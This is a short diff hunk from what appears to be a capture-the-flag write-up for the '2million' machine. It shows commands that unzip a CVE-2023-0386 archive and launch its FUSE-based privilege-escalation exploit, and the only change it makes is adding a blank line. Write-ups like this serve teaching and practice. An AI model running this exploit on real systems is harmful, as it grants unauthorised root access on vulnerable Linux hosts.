@@ -480,6 +480,7 @@ and we extracted the archive:
 admin@2million:~$ unzip cve.zip
 ```
 Finally, we lunched the exploit:
+
 **First terminal:**
 ```
 admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
